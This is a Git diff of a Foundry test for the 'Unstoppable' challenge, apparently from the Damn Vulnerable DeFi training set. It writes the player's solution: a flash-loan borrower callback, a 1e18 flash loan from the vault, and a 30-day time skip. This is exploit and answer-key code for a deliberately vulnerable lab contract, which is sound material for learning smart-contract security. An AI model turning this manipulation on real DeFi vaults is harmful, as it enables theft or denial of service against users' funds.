@@ -4,10 +4,11 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
+import {UnstoppableVault, Owned, ERC20} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
-contract UnstoppableChallenge is Test {
+contract UnstoppableChallenge is Test, IERC3156FlashBorrower {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
 
@@ -91,7 +92,16 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        vault.flashLoan(this, address(token), 1e18, bytes(""));
+        skip(30 days);
+    }
+
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
+        external
+        returns (bytes32)
+    {
+        ERC20(token).approve(address(vault), 10e18);
+        return keccak256("IERC3156FlashBorrower.onFlashLoan");
     }
 
     /**
